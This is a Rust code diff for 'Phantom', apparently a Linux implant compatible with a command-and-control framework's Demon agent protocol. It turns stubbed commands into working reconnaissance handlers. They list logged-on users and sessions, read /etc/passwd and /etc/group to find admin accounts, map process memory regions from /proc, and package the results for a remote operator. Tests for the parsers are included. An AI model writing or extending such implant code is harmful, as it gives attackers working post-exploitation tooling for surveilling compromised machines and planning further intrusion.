@@ -100,6 +100,56 @@ struct ProcessEntry {
     is_wow64: bool,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct SessionEntry {
+    client: String,
+    user: String,
+    active: u32,
+    idle: u32,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct ShareEntry {
+    name: String,
+    path: String,
+    remark: String,
+    access: u32,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct GroupEntry {
+    name: String,
+    description: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct UserEntry {
+    name: String,
+    is_admin: bool,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct MemoryRegion {
+    base: u64,
+    size: u32,
+    protect: u32,
+    state: u32,
+    mem_type: u32,
+}
+
+const PAGE_NOACCESS: u32 = 0x01;
+const PAGE_READONLY: u32 = 0x02;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_WRITECOPY: u32 = 0x08;
+const PAGE_EXECUTE: u32 = 0x10;
+const PAGE_EXECUTE_READ: u32 = 0x20;
+const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_PRIVATE: u32 = 0x20_000;
+const MEM_MAPPED: u32 = 0x40_000;
+const MEM_IMAGE: u32 = 0x100_0000;
+
 impl PhantomState {
     pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
         self.accept_reverse_port_forward_clients()?;
@@ -594,13 +644,15 @@ async fn execute_process(
             });
         }
         DemonProcessCommand::Memory => {
-            let pid = parser.int32()?;
-            let _query_protection = parser.int32()?;
-            state.queue_callback(PendingCallback::Error {
+            let pid = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
+            let query_protection = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
+            let regions = enumerate_memory_regions(pid, query_protection)?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProc),
                 request_id,
-                text: format!(
-                    "process memory enumeration for pid {pid} is not implemented in Phantom yet"
-                ),
+                payload: encode_proc_memory(pid, query_protection, &regions),
             });
         }
     }
@@ -624,21 +676,78 @@ fn execute_network(
             request_id,
             payload: encode_net_domain(&linux_domain_name())?,
         }),
-        DemonNetCommand::Computer => state.queue_callback(PendingCallback::Structured {
-            command_id: u32::from(DemonCommand::CommandNet),
-            request_id,
-            payload: encode_u32(u32::from(DemonNetCommand::Computer)),
-        }),
-        DemonNetCommand::Logons
-        | DemonNetCommand::Sessions
-        | DemonNetCommand::DcList
-        | DemonNetCommand::Share
-        | DemonNetCommand::LocalGroup
-        | DemonNetCommand::Group
-        | DemonNetCommand::Users => state.queue_callback(PendingCallback::Error {
-            request_id,
-            text: format!("network subcommand {subcommand:?} is not implemented in Phantom yet"),
-        }),
+        DemonNetCommand::Logons => {
+            let target = default_net_target(&parser.wstring()?);
+            let users = logged_on_users();
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_logons(&target, &users)?,
+            });
+        }
+        DemonNetCommand::Sessions => {
+            let target = default_net_target(&parser.wstring()?);
+            let sessions = logged_on_sessions();
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_sessions(&target, &sessions)?,
+            });
+        }
+        DemonNetCommand::Computer => {
+            let target = default_net_target(&parser.wstring()?);
+            let computers = compatible_computer_list(&target);
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_name_list(DemonNetCommand::Computer, &target, &computers)?,
+            });
+        }
+        DemonNetCommand::DcList => {
+            let target = default_net_target(&parser.wstring()?);
+            let controllers = compatible_dc_list(&target);
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_name_list(DemonNetCommand::DcList, &target, &controllers)?,
+            });
+        }
+        DemonNetCommand::Share => {
+            let target = default_net_target(&parser.wstring()?);
+            let shares = compatible_share_list();
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_shares(&target, &shares)?,
+            });
+        }
+        DemonNetCommand::LocalGroup => {
+            let target = default_net_target(&parser.wstring()?);
+            let groups = enumerate_groups()?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_groups(DemonNetCommand::LocalGroup, &target, &groups)?,
+            });
+        }
+        DemonNetCommand::Group => {
+            let target = default_net_target(&parser.wstring()?);
+            let groups = enumerate_groups()?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_groups(DemonNetCommand::Group, &target, &groups)?,
+            });
+        }
+        DemonNetCommand::Users => {
+            let target = default_net_target(&parser.wstring()?);
+            let users = enumerate_users()?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandNet),
+                request_id,
+                payload: encode_net_users(&target, &users)?,
+            });
+        }
     }
 
     Ok(())
@@ -1134,6 +1243,201 @@ fn linux_domain_name() -> String {
         .unwrap_or_default()
 }
 
+fn local_hostname() -> String {
+    fs::read_to_string("/etc/hostname")
+        .ok()
+        .map(|value| value.trim().to_string())
+        .filter(|value| !value.is_empty())
+        .or_else(|| std::env::var("HOSTNAME").ok().filter(|value| !value.is_empty()))
+        .unwrap_or_else(|| String::from("localhost"))
+}
+
+fn default_net_target(value: &str) -> String {
+    if value.is_empty() { local_hostname() } else { value.to_string() }
+}
+
+fn compatible_computer_list(target: &str) -> Vec<String> {
+    let hostname = local_hostname();
+    (target.eq_ignore_ascii_case(&hostname)
+        || target == "."
+        || target.eq_ignore_ascii_case("localhost"))
+    .then_some(hostname)
+    .into_iter()
+    .collect()
+}
+
+fn compatible_dc_list(target: &str) -> Vec<String> {
+    let domain = linux_domain_name();
+    if domain.is_empty() || !target.eq_ignore_ascii_case(&domain) {
+        return Vec::new();
+    }
+    vec![local_hostname()]
+}
+
+fn compatible_share_list() -> Vec<ShareEntry> {
+    Vec::new()
+}
+
+fn logged_on_users() -> Vec<String> {
+    parse_logged_on_users(&run_who())
+}
+
+fn logged_on_sessions() -> Vec<SessionEntry> {
+    parse_logged_on_sessions(&run_who())
+}
+
+fn run_who() -> String {
+    match std::process::Command::new("who").output() {
+        Ok(output) if output.status.success() => {
+            String::from_utf8_lossy(&output.stdout).into_owned()
+        }
+        _ => String::new(),
+    }
+}
+
+fn parse_logged_on_users(output: &str) -> Vec<String> {
+    let mut users = output
+        .lines()
+        .filter_map(|line| line.split_whitespace().next().map(str::to_string))
+        .collect::<Vec<_>>();
+    users.sort();
+    users.dedup();
+    users
+}
+
+fn parse_logged_on_sessions(output: &str) -> Vec<SessionEntry> {
+    output
+        .lines()
+        .filter_map(|line| {
+            let parts = line.split_whitespace().collect::<Vec<_>>();
+            let user = parts.first()?.to_string();
+            let fallback_client = parts.get(1).copied().unwrap_or_default().to_string();
+            let client = line
+                .rsplit_once('(')
+                .and_then(|(_, suffix)| suffix.strip_suffix(')'))
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .unwrap_or(&fallback_client)
+                .to_string();
+            Some(SessionEntry { client, user, active: 0, idle: 0 })
+        })
+        .collect()
+}
+
+fn enumerate_groups() -> Result<Vec<GroupEntry>, PhantomError> {
+    let contents =
+        fs::read_to_string("/etc/group").map_err(|error| io_error("/etc/group", error))?;
+    Ok(parse_group_entries(&contents))
+}
+
+fn parse_group_entries(contents: &str) -> Vec<GroupEntry> {
+    let mut groups = contents
+        .lines()
+        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
+        .filter_map(|line| {
+            let mut fields = line.split(':');
+            let name = fields.next()?.trim();
+            let _password = fields.next()?;
+            let gid = fields.next()?.trim();
+            let members = fields.next().unwrap_or_default().trim();
+            let description = if members.is_empty() {
+                format!("gid={gid}")
+            } else {
+                format!("gid={gid}; members={members}")
+            };
+            Some(GroupEntry { name: name.to_string(), description })
+        })
+        .collect::<Vec<_>>();
+    groups.sort_by(|left, right| left.name.cmp(&right.name));
+    groups
+}
+
+fn enumerate_users() -> Result<Vec<UserEntry>, PhantomError> {
+    let contents =
+        fs::read_to_string("/etc/passwd").map_err(|error| io_error("/etc/passwd", error))?;
+    Ok(parse_user_entries(&contents))
+}
+
+fn parse_user_entries(contents: &str) -> Vec<UserEntry> {
+    let mut users = contents
+        .lines()
+        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
+        .filter_map(|line| {
+            let mut fields = line.split(':');
+            let name = fields.next()?.trim();
+            let _password = fields.next()?;
+            let uid = fields.next()?.trim().parse::<u32>().ok()?;
+            Some(UserEntry { name: name.to_string(), is_admin: uid == 0 })
+        })
+        .collect::<Vec<_>>();
+    users.sort_by(|left, right| left.name.cmp(&right.name));
+    users
+}
+
+fn enumerate_memory_regions(
+    pid: u32,
+    query_protection: u32,
+) -> Result<Vec<MemoryRegion>, PhantomError> {
+    let maps_path = if pid == 0 {
+        PathBuf::from("/proc/self/maps")
+    } else {
+        PathBuf::from(format!("/proc/{pid}/maps"))
+    };
+    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
+    let mut regions = contents
+        .lines()
+        .filter_map(parse_memory_region)
+        .filter(|region| query_protection == 0 || region.protect == query_protection)
+        .collect::<Vec<_>>();
+    regions.sort_by(|left, right| left.base.cmp(&right.base));
+    Ok(regions)
+}
+
+fn parse_memory_region(line: &str) -> Option<MemoryRegion> {
+    let fields = line.split_whitespace().collect::<Vec<_>>();
+    let range = *fields.first()?;
+    let perms = *fields.get(1)?;
+    let path = fields.get(5).copied();
+    let (start, end) = range.split_once('-')?;
+    let base = u64::from_str_radix(start, 16).ok()?;
+    let end = u64::from_str_radix(end, 16).ok()?;
+    let size = u32::try_from(end.checked_sub(base)?).ok()?;
+    let protect = map_linux_protection(perms);
+    let mem_type = map_linux_memory_type(perms, path);
+    Some(MemoryRegion { base, size, protect, state: MEM_COMMIT, mem_type })
+}
+
+fn map_linux_protection(perms: &str) -> u32 {
+    match perms.as_bytes() {
+        [b'-', b'-', b'-', b'-', ..] => PAGE_NOACCESS,
+        [b'r', b'-', b'-', b'-', ..] => PAGE_READONLY,
+        [b'r', b'w', b'-', b'p', ..] => PAGE_READWRITE,
+        [b'r', b'w', b'-', b's', ..] => PAGE_WRITECOPY,
+        [b'-', b'-', b'x', b'-', ..] => PAGE_EXECUTE,
+        [b'r', b'-', b'x', b'p', ..] | [b'r', b'-', b'x', b's', ..] => PAGE_EXECUTE_READ,
+        [b'r', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
+        [b'r', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
+        [b'-', b'w', b'-', b'p', ..] | [b'-', b'w', b'-', b's', ..] => PAGE_READWRITE,
+        [b'-', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
+        [b'-', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
+        [b'-', b'-', b'x', b'p', ..] | [b'-', b'-', b'x', b's', ..] => PAGE_EXECUTE,
+        _ => PAGE_NOACCESS,
+    }
+}
+
+fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
+    match path {
+        Some(path) if path.starts_with('/') => {
+            if perms.contains('x') {
+                MEM_IMAGE
+            } else {
+                MEM_MAPPED
+            }
+        }
+        _ => MEM_PRIVATE,
+    }
+}
+
 fn normalize_path(value: &str) -> PathBuf {
     if value.is_empty() || value == "." {
         std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
@@ -1212,9 +1516,88 @@ fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, P
     Ok(payload)
 }
 
+fn encode_proc_memory(pid: u32, query_protection: u32, regions: &[MemoryRegion]) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonProcessCommand::Memory));
+    payload.extend_from_slice(&encode_u32(pid));
+    payload.extend_from_slice(&encode_u32(query_protection));
+    for region in regions {
+        payload.extend_from_slice(&encode_u64(region.base));
+        payload.extend_from_slice(&encode_u32(region.size));
+        payload.extend_from_slice(&encode_u32(region.protect));
+        payload.extend_from_slice(&encode_u32(region.state));
+        payload.extend_from_slice(&encode_u32(region.mem_type));
+    }
+    payload
+}
+
 fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
     let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
     payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
+    Ok(payload)
+}
+
+fn encode_net_name_list(
+    subcommand: DemonNetCommand,
+    target: &str,
+    names: &[String],
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(subcommand));
+    payload.extend_from_slice(&encode_utf16(target)?);
+    for name in names {
+        payload.extend_from_slice(&encode_utf16(name)?);
+    }
+    Ok(payload)
+}
+
+fn encode_net_logons(target: &str, users: &[String]) -> Result<Vec<u8>, PhantomError> {
+    encode_net_name_list(DemonNetCommand::Logons, target, users)
+}
+
+fn encode_net_sessions(target: &str, sessions: &[SessionEntry]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonNetCommand::Sessions));
+    payload.extend_from_slice(&encode_utf16(target)?);
+    for session in sessions {
+        payload.extend_from_slice(&encode_utf16(&session.client)?);
+        payload.extend_from_slice(&encode_utf16(&session.user)?);
+        payload.extend_from_slice(&encode_u32(session.active));
+        payload.extend_from_slice(&encode_u32(session.idle));
+    }
+    Ok(payload)
+}
+
+fn encode_net_shares(target: &str, shares: &[ShareEntry]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonNetCommand::Share));
+    payload.extend_from_slice(&encode_utf16(target)?);
+    for share in shares {
+        payload.extend_from_slice(&encode_utf16(&share.name)?);
+        payload.extend_from_slice(&encode_utf16(&share.path)?);
+        payload.extend_from_slice(&encode_utf16(&share.remark)?);
+        payload.extend_from_slice(&encode_u32(share.access));
+    }
+    Ok(payload)
+}
+
+fn encode_net_groups(
+    subcommand: DemonNetCommand,
+    target: &str,
+    groups: &[GroupEntry],
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(subcommand));
+    payload.extend_from_slice(&encode_utf16(target)?);
+    for group in groups {
+        payload.extend_from_slice(&encode_utf16(&group.name)?);
+        payload.extend_from_slice(&encode_utf16(&group.description)?);
+    }
+    Ok(payload)
+}
+
+fn encode_net_users(target: &str, users: &[UserEntry]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonNetCommand::Users));
+    payload.extend_from_slice(&encode_utf16(target)?);
+    for user in users {
+        payload.extend_from_slice(&encode_utf16(&user.name)?);
+        payload.extend_from_slice(&encode_bool(user.is_admin));
+    }
     Ok(payload)
 }
 
@@ -1563,7 +1946,12 @@ mod tests {
         DemonSocketCommand,
     };
 
-    use super::{PendingCallback, PhantomState, execute};
+    use super::{
+        GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE_READ,
+        PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState, SessionEntry,
+        UserEntry, execute, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
+        parse_memory_region, parse_user_entries,
+    };
 
     fn utf16_payload(value: &str) -> Vec<u8> {
         let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
@@ -1576,6 +1964,13 @@ mod tests {
     fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
         let end = *offset + 4;
         let value = u32::from_be_bytes(payload[*offset..end].try_into().expect("u32"));
+        *offset = end;
+        value
+    }
+
+    fn read_u64(payload: &[u8], offset: &mut usize) -> u64 {
+        let end = *offset + 8;
+        let value = u64::from_be_bytes(payload[*offset..end].try_into().expect("u64"));
         *offset = end;
         value
     }
@@ -1713,6 +2108,89 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn net_users_returns_structured_payload_instead_of_stub_error() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonNetCommand::Users as i32).to_le_bytes());
+        payload.extend_from_slice(&utf16_payload("HOST01"));
+        let package = DemonPackage::new(DemonCommand::CommandNet, 9, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
+        assert_eq!(*request_id, 9);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Users));
+        assert_eq!(read_utf16(payload, &mut offset), "HOST01");
+        assert!(offset < payload.len(), "expected at least one passwd-backed user");
+        let _username = read_utf16(payload, &mut offset);
+        let _is_admin = read_u32(payload, &mut offset);
+    }
+
+    #[tokio::test]
+    async fn net_computer_echoes_target_with_structured_payload() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonNetCommand::Computer as i32).to_le_bytes());
+        payload.extend_from_slice(&utf16_payload("CORP.LOCAL"));
+        let package = DemonPackage::new(DemonCommand::CommandNet, 10, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
+        assert_eq!(*request_id, 10);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Computer));
+        assert_eq!(read_utf16(payload, &mut offset), "CORP.LOCAL");
+    }
+
+    #[tokio::test]
+    async fn proc_memory_returns_structured_payload_instead_of_stub_error() {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonProcessCommand::Memory as i32).to_le_bytes());
+        payload.extend_from_slice(&0_i32.to_le_bytes());
+        payload.extend_from_slice(&0_i32.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
+        assert_eq!(*request_id, 11);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Memory));
+        assert_eq!(read_u32(payload, &mut offset), 0);
+        assert_eq!(read_u32(payload, &mut offset), 0);
+        assert!(offset < payload.len(), "expected at least one memory region");
+        let _base = read_u64(payload, &mut offset);
+        let _size = read_u32(payload, &mut offset);
+        let _protect = read_u32(payload, &mut offset);
+        let _state = read_u32(payload, &mut offset);
+        let _type = read_u32(payload, &mut offset);
+    }
+
+    #[tokio::test]
     async fn memfile_then_upload_emits_expected_callbacks() {
         let content = b"phantom-upload";
 
@@ -1772,5 +2250,100 @@ mod tests {
             state.drain_callbacks().as_slice(),
             [PendingCallback::Socket { request_id: 5, .. }]
         ));
+    }
+
+    #[test]
+    fn parse_logged_on_users_deduplicates_and_sorts() {
+        let users = parse_logged_on_users(
+            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
+             bob pts/1 2026-03-23 10:05 (10.0.0.2)\n\
+             alice pts/2 2026-03-23 10:10 (10.0.0.3)\n",
+        );
+        assert_eq!(users, vec!["alice".to_owned(), "bob".to_owned()]);
+    }
+
+    #[test]
+    fn parse_logged_on_sessions_prefers_remote_host_when_present() {
+        let sessions = parse_logged_on_sessions(
+            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
+             bob pts/1 2026-03-23 10:05\n",
+        );
+        assert_eq!(
+            sessions,
+            vec![
+                SessionEntry {
+                    client: "10.0.0.1".to_owned(),
+                    user: "alice".to_owned(),
+                    active: 0,
+                    idle: 0,
+                },
+                SessionEntry {
+                    client: "pts/1".to_owned(),
+                    user: "bob".to_owned(),
+                    active: 0,
+                    idle: 0,
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn parse_user_entries_marks_uid_zero_as_admin() {
+        let users = parse_user_entries(
+            "root:x:0:0:root:/root:/bin/bash\n\
+             daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+        );
+        assert_eq!(
+            users,
+            vec![
+                UserEntry { name: "daemon".to_owned(), is_admin: false },
+                UserEntry { name: "root".to_owned(), is_admin: true },
+            ]
+        );
+    }
+
+    #[test]
+    fn parse_group_entries_formats_gid_and_members() {
+        let groups = parse_group_entries(
+            "root:x:0:\n\
+             wheel:x:10:alice,bob\n",
+        );
+        assert_eq!(
+            groups,
+            vec![
+                GroupEntry { name: "root".to_owned(), description: "gid=0".to_owned() },
+                GroupEntry {
+                    name: "wheel".to_owned(),
+                    description: "gid=10; members=alice,bob".to_owned(),
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn parse_memory_region_maps_linux_permissions_to_windows_compatible_constants() {
+        let image = parse_memory_region("00400000-00452000 r-xp 00000000 08:01 12345 /usr/bin/cat")
+            .expect("image region");
+        assert_eq!(image.base, 0x0040_0000);
+        assert_eq!(image.size, 0x52_000);
+        assert_eq!(image.protect, PAGE_EXECUTE_READ);
+        assert_eq!(image.state, MEM_COMMIT);
+        assert_eq!(image.mem_type, MEM_IMAGE);
+
+        let mapped =
+            parse_memory_region("7f0000000000-7f0000001000 rw-s 00000000 00:05 99 /dev/shm/demo")
+                .expect("mapped region");
+        assert_eq!(mapped.protect, super::PAGE_WRITECOPY);
+        assert_eq!(mapped.mem_type, MEM_MAPPED);
+
+        let private =
+            parse_memory_region("7ffd5f1c4000-7ffd5f1e5000 rw-p 00000000 00:00 0 [stack]")
+                .expect("private region");
+        assert_eq!(private.protect, PAGE_READWRITE);
+        assert_eq!(private.mem_type, MEM_PRIVATE);
+
+        let writable_exec = parse_memory_region("7f0000002000-7f0000003000 rwxp 00000000 00:00 0")
+            .expect("writable exec region");
+        assert_eq!(writable_exec.protect, PAGE_EXECUTE_READWRITE);
     }
 }
